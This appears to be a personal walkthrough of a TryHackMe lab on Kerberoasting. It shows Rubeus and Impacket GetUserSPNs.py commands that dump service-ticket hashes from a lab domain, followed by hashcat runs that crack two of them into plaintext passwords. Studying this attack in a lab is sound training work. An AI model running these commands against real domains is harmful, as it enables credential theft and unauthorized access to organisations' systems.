https://tryhackme.com/r/room/attackingkerberos
https://princerohit8800.medium.com/detecting-kerberoasting-using-getuserspns-py-bf33c084c530

# Kerberosting

Kerberoasting is an attack that abuses a feature of the Kerberos protocol to harvest password hashes for Active Directory user accounts 

Any authenticated domain user can request service tickets for an account by specifying its Service Principal Name (SPN), and the ticket granting service (TGS) on the domain controller will return a ticket that is encrypted using the NTLM hash of the account’s password.

Note The type of Accounts we target in Kerberosting are Service acounts.

https://tools.thehacker.recipes/impacket/examples/getuserspns.py

`GetUserSPNs.py can be used to obtain a password hash for user accounts that have an SPN (service principal name). If an SPN is set on a user account it is possible to request a Service Ticket for this account and attempt to crack it in order to retrieve the user password. This attack is named Kerberoast. `

# `Enumerate Kerberoastable accounts`

To enumerate Kerberoastable accounts I would suggest a tool like `BloodHound` to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. 

# `Perform Attack`

In order to perform the attack, we'll be using both `Rubeus` as well as `Impacket` so you understand the various tools out there for Kerberoasting. 

There are other tools out there such a `kekeo` and `Invoke-Kerberoast` but I'll leave you to do your own research on those tools.

1. Kerberosting with `Rubeus.exe`                     (This needs to be on Target Machine)
- `Rubeus.exe kerberoast`

2. Kerberosting using Impacat's `GetUserSPN.py`       (This not need to be on Target can can be done remotely from kali)
- `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.229.169 -request`

domain - controller.local


**************************************************************************************************************************

1. Kerberosting with `Rubeus`

command - `Rubeus.exe kerberoast`

controller\administrator@CONTROLLER-1 C:\Users\Administrator> `cd Downloads`
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`dir`
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

05/25/2020  03:45 PM    <DIR>          .
05/25/2020  03:45 PM    <DIR>          ..
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
               2 File(s)      1,476,360 bytes
               2 Dir(s)  50,892,767,232 bytes free
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe kerberoast`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

 
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$1E5F022293A9DEFB9EB83632AF1B08B4$0A7211B3B4F57D8753642FA0736736A05FC433 
                             274D81D815895DE6B8FA4017C975C406F1D909ACDE88181D0A03E9C38B3857606526FDD1728A565E
                             6CA9B61711383E7FC25DC625A0649FF72053A1C7F55967AAEE572CAE7834256FA4F260A824BD34DD
                             42E97EE9C65BB1ECE7460993129AE64049BFC5381A31D32A4C4AC088081903AC18D00920DC964373
                             9034FD17463A4A510CA1F64AC30C86BBA007613904FF84AA9CF812CF0378CAD94A6833932E8ECE37
                             17348E3364DE027FBE26D8F6CDD6F73D0794464F58041110B74C25982771147B10B6DCDCE8584F0F
                             0DA7CD1C7327D0778DC68DC89F9016A1640609AF25DE2219871A9A89589068DD01D621B3BCB8EE02
                             EB96A214E1B56B2D9B13B0F90EBDDDC7F171E62448B8B35DD4A6145420E39828C1AD7ECE3D93CD19
                             148F6DF0C0247D7E62903C8910730A8E2D5183D678589F3C55AED010498DC022470C7B2CD449DAA3
                             730875AEB38011D95571CCA37DB947A9EB6D5983EFF86757276FA66965EDF7E4853D59D3E880F031
                             13B572C101FEE4CD9EF893032E399EF3D17180822D1DE40C4E81259499027B0E1C8D57DA84B86F9B
                             98CEC5949D0517652C4563D4EF1E2C438E079C2ED25177C0AF2A258FA9BCE6D8D0D6F6EE84411D7B
                             2B737E842C77F6BA813DABC1315022D6B558F20F01340BF99B62D2010E9A43ED479A3C7A8204AF52
                             A92F1DF0D276612E1DE1F7A270026D1138AC1AB7258A386BF679F9DC1551CD4F9B3DE8E31018A768
                             CA8DF495F2AE39AF545EC9A80099188BEFAC50B95260A87E1AEE9C414BF2F68114CD0032742A576E
                             2C436234225C4E99959EFB7D8DAA7AFE9CCCDDA86D227A48C80D95CD82364B864D347820F46F8ED5
                             37893EB881747F14A23240EE673A0B998C64DDFAB2594065EBC7E35982DA732E3F7D2BD02A9FF21D
                             4809DAFC4D614530237915ED90CC7129AF68BCF77B59BBFE2495CC09D43F59CC33D9596472E1D861
                             50FC48D728D1481121FA8DEDE38B7695CEF660DF02DB1C08E0D8F4FFFFA69785761E367ED0F61158
                             0F53ACB62A1B1D236989794580DC80DACBFADCAD26F3D0ED2E7BCAF75A80AABBB077E194E23D59DC
                             F443365AA16ACCD38E8F9FE852E4FE2D3B57A3A3B22D197CBB1718EED17BB0D397072D49C2D20250
                             B4C042E6CCE6E29F37DF66B40ACC31C92868CAD24C017AA05125C59501D96C876FD4923A6E9F5CB0
                             61E4221F2C496C46EECF0863442C10BC0A0325A6EE15009A8838CAA8A59BEC586D18CE2747E98AB3
                             E45AF7331652D901FE8F238A0FB684E427E589D2E617D6D726EBD28A72BCDF6905D0154F23133047
                             2EC2AABF5F0977A73E60E37D64C830F02226A30B08D760E2CB053814F8EEE0A4E148D1354D7F39AA
                             C5FEE6AF682C84821C11EB802718AB0327F773249F3C3858FCA96FDF33271145614021F0FE6C18A2
                             7F4B47119FD85C66652F85996CAFF33ACC21A02630CAC12B85730519E81C57C47FAFD3852677ABA5
                             1B60C8FDCB0AED3DF1A5B75496954AD3F69F271B0F2D9DFFA8F8862E3973203863ABFB425892E90A
                             FE07164730059EE322BDCD129C323E64CE0FA169672CDA4F20DB8ABC6459635275423BC2BCEA7AEA
                             E7E0E016197E43B53E4F6DCF1FF9B631BB0D9AF005715F862C8E6F8C8C


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$C5574BD1BFF0B2DE96193BF1F75BACEE$E3043484993F64B14491E31A75E61CA79888
                             6248582ACC9B16BC803C856F2CAB4CD1A1A689DABB11026EB2801E20301C6E0720CEE5B048ADB8F9
                             384625802D55147199B9B5F05E3B3D4B44C4A7DDDB3144D5C83136AC64917EB24CD265AAC4E28F6A
                             CD474451CFB83546409F8CDA54B5F43C36A13EA8D11650F2AC1A523E8CE8128AD4DA782FA1B73B87
                             29407EAB7800FF4D55524BB6BAC9641B7E548F742EB6568C712C4FF7E8A9E71E5349FF141177EC22
                             0DA24A9DE75ED35495D3DB4C4A0DD264E5AA25FB15280BFE8EA6639988A6665823A35E1ECF6F4830
                             36BDCC2BA5D434F02961936CE5BFAE5AF1DCA2584793D18B69222D1F533C270616522549B4E19F83
                             96A61773A3A6FADF469EA879649F0542C8FDF989615FAC422E5405478683123CAF6CBCEF6A090961
                             89505C28F25F62A0215275D359513909FB400EFCB5A0D3B44BBCFE1B1474300FB50CCCC4CA4D459D
                             C5981C3E76E8D14681392CC033C905EDCA913308F1998A20CB84CDAD03B98A2997563C6201EEAC3C
                             BE7223314332FD608028A0DE775A10836EA20A7CCF1A1C94D370C34B89204714F930EA27AE887BDB
                             4BD8131E9578A2289246C13B33A8613A218D87D1A337CB634E5AC955C1139D6265A2DDBA4B1F4330
                             821036385D3E02546AD3D271FE6AE575C39322FA0EDC330413A99C853734CF4E73497174D3C540B2
                             F61B20837EB3438C3A26B27B24FE0CEC777730D8C1675836BA12EE22750BDA57DBC256BFD1C7C8EA
                             4318CFEF400CBB74A5247FE0A1690DD6D269E8A212DC45F3035B440ED2780BCB7FAC2ED8FB56127E
                             A529A9763AC70C6D442128571AEF5D6D6C5F0D29790E52AE6F5F036937D82C2C1929EA83353D5A87
                             346C0BB0A338432D939637BB621C91EE2B366E1F69C9FC509F9A8606590B3A2670B755978226989F
                             9A48A054D5910AF59453EE57D925F113EB22DADE9592708B670800CF9B216EC39A509E5F58E67C8D
                             4DB73E44C306832E4AEE87EB5FC759BE17213025B4D75FF9BDA37A2860BF582495437804EBED7E43
                             C20CEDE8483F4B1B4932ECDEC9773233EBEDACE10250D055E923E3F523FDFDB6C18A06710796A84B
                             50FFF3F3ACAEBEA58F38E0578F62E2330D89AE101F2650325F54A3B0BE9EABF44B1C7E5D53BA3734
                             6C0A37EE7877CDB5A58AFF94B6DE87F25D20DA0F52A2513F198B22AFF060FE3190B29D6AFCBEA4FC
                             50591A7762912852BDCCD5A1AE21DBE7025FD309DFC291002EFB765195931FA1E97F45C5B51E2D68
                             D3DDE2D287BCC9BA870F1FD5838C96A1EF81DB9CCA753A84853E16A148751DD4CBC824AA4780F7C4
                             EB61B9806DB545825C510ECD74E0A47860DE0B4836E342B1DAAB010F9B37A09719D4E0013FD9AFFC
                             AE536889EA8DB96A42BE9524E9AC8031E825240D7429896FBD2FD494ED6EC368E447DED95269FF65
                             1B503CC174B55496145E70C87CD0A5FE5FE6E58D178DCE34F56489F6D5CA7DEF6A3A353E1EDD4374
                             29B40F3320EF0FA9955B0AE19BC996DD0E7EE76E6F4C51B105CE834BA6DF1DBCAB0320527381144B
                             BB1F09FBC8118901CAA8D0C0E8C2ECC48B9C1A5AC135110D468F9327B218BD2FF487B3485332B00C
                             2337F9D23466A300395DEF58EE566432B14097F4E5AEF81882C4B087651A


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads> 


We Got hash for two diffrent `Service Principal Name` , Lets crack First Hash



┌──(kali㉿kali)-[~]
└─$ `nano Kerberoshash.txt`

┌──(kali㉿kali)-[~]
└─$ `hashcat -m 13100 -a 0 Kerberoshash.txt rockyou_modified.txt` 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-8130U CPU @ 2.20GHz, 1438/2940 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: rockyou_modified.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

Approaching final keyspace - workload adjusted.           

$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$fe554878e89dcada0ee2501f35da3c43$f09b76cf93aef4d6382fe5bc1bceaa5ef39c75344b8e807c7e60800e694959116fec98686e1992a4c87d9e1b2f4eb711987ebf52858fb3acd828aae04bea5868a85d4302b4af84a759fe15c8d12df560716181896ba51140a0a6655ab5ac65cd21436ad2f55d3c1f4ceddd0952f5d0382db98e60dfd17ac7bb6f9175fa8147e350cef5db3638e90c273ff36f2ed2238dee7aa7ef35c8a20e270927b282a7322c903ea40ba6952cf585043b64ab352b8036f173d5448a6cdc7a32b481ac2bfcf7f41bf59c258985f1fef414e16543dd575fc4235ad23ba4189bb4cf076ced23e7294cb4395a16da3af5e277d242b7260e67ab6259d93ffe3494460dc10ea69d83b3003601477793500caac969605d6add29738fb9f789fb50648fb9f4e869fd4759e4acf04d3bdc77acfe7d85593999075f550d887e1b4aa3fe7259d052b961935d6ca0ef3712a6a26ad0c1958c87364862785a174c05faebdfd6de92e08f8129d1ba8173a7e34181c96e61067f23495ef74aeecf2794b606bc95d5e6872764e6e11aa93cae6d46d5c5050aecf9f5b913ca562a08a6bbba8f6f01c3dcdb43c92c33903a14b6f8534d7c433a5ca0c60a91e1e28bea3cc409266b02d2d6f36ac7d239d5ddf77f70ff0055d6630eed3d61c7f4c7f8d0a1dd57c2b929e88981d176a1ad989d5e54be2cbb1cf18a3da2f268ffff9889f5c2f7cfaaa5b2c90728af1607b4e681934261a7049fff2258b6043c17dce0bed5b9113a54628cd3e5428d53b3d07902b60e0f7568fc8c64e0679a2312822ab787ce915926131a01b6c8c92c8b0bbb10cc7632cd7f686883ba1c6897563cac49e80064725d5400ec8f4216c5419e20314b9de1be33dc4823ed7f7f481e91ccec44ce29e0a81516e85fa5d87bbb2429a0d306cc70f700bee331b84605452be1f65a54bbccc472141b67a33c14c00c1428748e7fec20700a891101680c3c33ef3621b4801b664d3d77af6513675fd7d758731a8265a987e09bc96b82c04e977bdd4269e5944712f24b128d4192dd6574b253fc6925039c756e378f02913116d9bdde364e6cb22652520c7da3f07501064e5da5a56fbeb19515553ec0e7cbdb887db755b5251872905685d8da57208ecf781f2244567d707de74681005964cf3fc65b2440fd82b796aa33575d407cb0370e3304d55e20a9921fa174600f24e42239859de9166162fa123426efec7d08a5471cbcb719a3bca99e6058dce0f30d126493f229cd629e8bf98d30cb9bcecc25a899f128410ee9dc5c45e95d58dd4927f9272d9b08f0e9f209f42c716a9adeffb2a84c48bebbf476edde89fb5421fdcc0e88f43b3abfb619d3b0845229b021d5a05832dc880dca398501ed983ed97a:MYPassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller...3ed97a
Time.Started.....: Sat Apr 20 10:07:29 2024 (0 secs)
Time.Estimated...: Sat Apr 20 10:07:29 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou_modified.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   614.9 kH/s (0.48ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 1024/1240 (82.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: paulina -> hello123
Hardware.Mon.#1..: Util: 30%

Started: Sat Apr 20 10:07:27 2024
Stopped: Sat Apr 20 10:07:31 2024


We got the password - MYPassword123#

Now lets see Kerberosting using Impacat's `GetUserSPN.py`

*************************************************************************

2. Kerberosting using Impacat's `GetUserSPN.py`

┌──(kali㉿kali)-[~]
└─$ `cd /usr/share/doc/python3-impacket/examples/`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ `ls`
addcomputer.py  exchanger.py        GetNPUsers.py   goldenPac.py      machine_role.py   netview.py            ping.py        registry-read.py  samrdump.py     smbpasswd.py  split.py            wmiquery.py
atexec.py       findDelegation.py   getPac.py       karmaSMB.py       mimikatz.py       nmapAnswerMachine.py  psexec.py      reg.py            secretsdump.py  smbrelayx.py  ticketConverter.py
dcomexec.py     GetADUsers.py       getST.py        keylistattack.py  mqtt_check.py     ntfs-read.py          raiseChild.py  rpcdump.py        services.py     smbserver.py  ticketer.py
dpapi.py        getArch.py          getTGT.py       kintercept.py     mssqlclient.py    ntlmrelayx.py         rbcd.py        rpcmap.py         smbclient.py    sniffer.py    wmiexec.py
esentutl.py     Get-GPPPassword.py  GetUserSPNs.py  lookupsid.py      mssqlinstance.py  ping6.py              rdp_check.py   sambaPipe.py      smbexec.py      sniff.py      wmipersist.py


# `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.229.169 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; `however, this does not have to be on the targets machine and can be done remotely.`

┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.229.169 -request`
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$fe554878e89dcada0ee2501f35da3c43$f09b76cf93aef4d6382fe5bc1bceaa5ef39c75344b8e807c7e60800e694959116fec98686e1992a4c87d9e1b2f4eb711987ebf52858fb3acd828aae04bea5868a85d4302b4af84a759fe15c8d12df560716181896ba51140a0a6655ab5ac65cd21436ad2f55d3c1f4ceddd0952f5d0382db98e60dfd17ac7bb6f9175fa8147e350cef5db3638e90c273ff36f2ed2238dee7aa7ef35c8a20e270927b282a7322c903ea40ba6952cf585043b64ab352b8036f173d5448a6cdc7a32b481ac2bfcf7f41bf59c258985f1fef414e16543dd575fc4235ad23ba4189bb4cf076ced23e7294cb4395a16da3af5e277d242b7260e67ab6259d93ffe3494460dc10ea69d83b3003601477793500caac969605d6add29738fb9f789fb50648fb9f4e869fd4759e4acf04d3bdc77acfe7d85593999075f550d887e1b4aa3fe7259d052b961935d6ca0ef3712a6a26ad0c1958c87364862785a174c05faebdfd6de92e08f8129d1ba8173a7e34181c96e61067f23495ef74aeecf2794b606bc95d5e6872764e6e11aa93cae6d46d5c5050aecf9f5b913ca562a08a6bbba8f6f01c3dcdb43c92c33903a14b6f8534d7c433a5ca0c60a91e1e28bea3cc409266b02d2d6f36ac7d239d5ddf77f70ff0055d6630eed3d61c7f4c7f8d0a1dd57c2b929e88981d176a1ad989d5e54be2cbb1cf18a3da2f268ffff9889f5c2f7cfaaa5b2c90728af1607b4e681934261a7049fff2258b6043c17dce0bed5b9113a54628cd3e5428d53b3d07902b60e0f7568fc8c64e0679a2312822ab787ce915926131a01b6c8c92c8b0bbb10cc7632cd7f686883ba1c6897563cac49e80064725d5400ec8f4216c5419e20314b9de1be33dc4823ed7f7f481e91ccec44ce29e0a81516e85fa5d87bbb2429a0d306cc70f700bee331b84605452be1f65a54bbccc472141b67a33c14c00c1428748e7fec20700a891101680c3c33ef3621b4801b664d3d77af6513675fd7d758731a8265a987e09bc96b82c04e977bdd4269e5944712f24b128d4192dd6574b253fc6925039c756e378f02913116d9bdde364e6cb22652520c7da3f07501064e5da5a56fbeb19515553ec0e7cbdb887db755b5251872905685d8da57208ecf781f2244567d707de74681005964cf3fc65b2440fd82b796aa33575d407cb0370e3304d55e20a9921fa174600f24e42239859de9166162fa123426efec7d08a5471cbcb719a3bca99e6058dce0f30d126493f229cd629e8bf98d30cb9bcecc25a899f128410ee9dc5c45e95d58dd4927f9272d9b08f0e9f209f42c716a9adeffb2a84c48bebbf476edde89fb5421fdcc0e88f43b3abfb619d3b0845229b021d5a05832dc880dca398501ed983ed97a
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$6b4c3041853ffd726b5e0d80eb0ec3dc$8e357edcc312ca1ab3752f5fb0c1a7f81a4b9143ce5810cdfdfe018d810d13e960a550cadacb8e3263b36e5a87d916bcb09715c5d7d57ee7f42592911ab4bca0d59f2a0fa03659365e49f5a367b44aa72c1a23e0f44f68b9370ac6f2f628868d75722c01a615bd0d77b7a2a5cebd78e5351cd1b748d624fea4a6c4d0d540f3a01d8ae05a1460230bac414fa47077755d194aaf3ca00959a5a9652231f0269cb32e9ab3099105b498ef1b1c4f54e029d41e6fe39f012bd496491d5b8a8d1c3e362831073557ee81c104626c096febfc16564a59724bd2256082d0b4863bdb2c7a00a2566f957ecf700a389161a8b13cc0d2911566b7960db25401d5622544c96d3cecec4041c8c1665b9943c5ebb1b611e5688f932c5c2837e8dc77359962e867eef8101011ba9a0fa5e64fbf4ac1fea68c75d955d7346f31022c4aa9552a0901e19c124609ea9322f785b1c44ff2dc1c7bc055ff6ded2f7a9cd0ccee3473d589386ff20b234e8babe035c6ae07f47adb6581a8ac4bd89e890beed62aa08378fbe44e70114e77442aa10ecfb0ed61b62daf330a4eb9497a6828532bf836a0be2873ff3fb08f19943cf056bbde859a8a1c0ca11f3ad3d453aefaab6e048415d07dbde72111c5185002bca91865d4837982ea1c855f1a4fef8d3b81a50fb591c997a14d52be88c12c424d7d23ddc095c4d1aa6ae152c6192fc3c8286f378144458ba902cf30da2ee4c3ad3a9ecde6f8601cfdf0028f9750b55da246c69e23d49228188f2aadef59521050548093bf1a60a2f94e4ad1337d3fb94eea8714033a5cf2c8d2ff33a0d62ef32580e7b10c2201a493805b872f5b01119bbb38a1fa9d228aef85cd2f177a9eff4d29092300ce05b2b5f84050a906517862ce04e8d8289ffbb92fd4bf2a8b23d42099f7683812547bae50f202f948b4c5a0c1afb610478251544569003247ae248aaa77428514ec441602a2aca6d6bd242a07222a43b068a78774e6fe8ac3668982101530b64f7819b9560cfd8b4a8e3df0ad95f6f866b87c99c05dd4d88568488ffb022c87363fde8fd4ed0eaba202c88d6f06ba6a04f1a532356b67be6e086496dcb27585537e4d9378a014d238ba20c59bb7435abceede97dfed17831f777f224dde61dd002d55d1dc3a12a96997b6b134138bce68238acae7f9bdc5958a69381117d996203b307e76950b27f2138911a04772ff6fd193e9c340545b37922ae20b379171f1423dc32c321073417829d800e59a50502834f4d0e21afb43e41caca16fd6fe2238e8d9de1081ebc7aca366166cb46f383ee91586834f8138f60ee0b3a0d9c6fbcac272e6791e8748cd1cecf478bdf6ae4aad2132fb38d45e3620414d463521f75a6b38



We Got the same two Hash, we already cracked first one, lets crack second one now



┌──(kali㉿kali)-[~]
└─$ `sudo nano Kerberoshash.txt`                                 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ `hashcat -m 13100 -a 0 Kerberoshash.txt rockyou_modified.txt`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-8130U CPU @ 2.20GHz, 1438/2940 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: rockyou_modified.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$6b4c3041853ffd726b5e0d80eb0ec3dc$8e357edcc312ca1ab3752f5fb0c1a7f81a4b9143ce5810cdfdfe018d810d13e960a550cadacb8e3263b36e5a87d916bcb09715c5d7d57ee7f42592911ab4bca0d59f2a0fa03659365e49f5a367b44aa72c1a23e0f44f68b9370ac6f2f628868d75722c01a615bd0d77b7a2a5cebd78e5351cd1b748d624fea4a6c4d0d540f3a01d8ae05a1460230bac414fa47077755d194aaf3ca00959a5a9652231f0269cb32e9ab3099105b498ef1b1c4f54e029d41e6fe39f012bd496491d5b8a8d1c3e362831073557ee81c104626c096febfc16564a59724bd2256082d0b4863bdb2c7a00a2566f957ecf700a389161a8b13cc0d2911566b7960db25401d5622544c96d3cecec4041c8c1665b9943c5ebb1b611e5688f932c5c2837e8dc77359962e867eef8101011ba9a0fa5e64fbf4ac1fea68c75d955d7346f31022c4aa9552a0901e19c124609ea9322f785b1c44ff2dc1c7bc055ff6ded2f7a9cd0ccee3473d589386ff20b234e8babe035c6ae07f47adb6581a8ac4bd89e890beed62aa08378fbe44e70114e77442aa10ecfb0ed61b62daf330a4eb9497a6828532bf836a0be2873ff3fb08f19943cf056bbde859a8a1c0ca11f3ad3d453aefaab6e048415d07dbde72111c5185002bca91865d4837982ea1c855f1a4fef8d3b81a50fb591c997a14d52be88c12c424d7d23ddc095c4d1aa6ae152c6192fc3c8286f378144458ba902cf30da2ee4c3ad3a9ecde6f8601cfdf0028f9750b55da246c69e23d49228188f2aadef59521050548093bf1a60a2f94e4ad1337d3fb94eea8714033a5cf2c8d2ff33a0d62ef32580e7b10c2201a493805b872f5b01119bbb38a1fa9d228aef85cd2f177a9eff4d29092300ce05b2b5f84050a906517862ce04e8d8289ffbb92fd4bf2a8b23d42099f7683812547bae50f202f948b4c5a0c1afb610478251544569003247ae248aaa77428514ec441602a2aca6d6bd242a07222a43b068a78774e6fe8ac3668982101530b64f7819b9560cfd8b4a8e3df0ad95f6f866b87c99c05dd4d88568488ffb022c87363fde8fd4ed0eaba202c88d6f06ba6a04f1a532356b67be6e086496dcb27585537e4d9378a014d238ba20c59bb7435abceede97dfed17831f777f224dde61dd002d55d1dc3a12a96997b6b134138bce68238acae7f9bdc5958a69381117d996203b307e76950b27f2138911a04772ff6fd193e9c340545b37922ae20b379171f1423dc32c321073417829d800e59a50502834f4d0e21afb43e41caca16fd6fe2238e8d9de1081ebc7aca366166cb46f383ee91586834f8138f60ee0b3a0d9c6fbcac272e6791e8748cd1cecf478bdf6ae4aad2132fb38d45e3620414d463521f75a6b38:Summer2020
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controlle...5a6b38
Time.Started.....: Sat Apr 20 09:44:43 2024 (0 secs)
Time.Estimated...: Sat Apr 20 09:44:43 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou_modified.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   925.0 kH/s (0.55ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/1240 (82.58%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> moomoo
Hardware.Mon.#1..: Util: 28%

Started: Sat Apr 20 09:44:42 2024
Stopped: Sat Apr 20 09:44:45 2024




We got the password Summer2020